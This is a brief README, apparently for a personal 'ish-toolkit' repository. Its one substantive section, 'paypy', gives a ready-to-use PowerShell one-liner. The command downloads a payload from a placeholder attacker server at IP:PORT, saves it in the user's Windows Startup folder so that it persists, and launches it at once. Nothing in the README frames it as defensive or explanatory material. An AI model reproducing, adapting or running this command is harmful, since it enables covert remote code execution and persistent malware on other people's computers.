# ish-toolkit
ish is a limited environment, thats why im making the toolkit 

# paypy
#### powershell command to store in shell:startup and run payload from server:
```powershell
$payload = 'PAYLOAD'; Invoke-WebRequest -Uri "http://IP:PORT/$payload" -OutFile "$env:USERPROFILE\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\$payload"; Start-Process "$env:USERPROFILE\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\$payload"
```
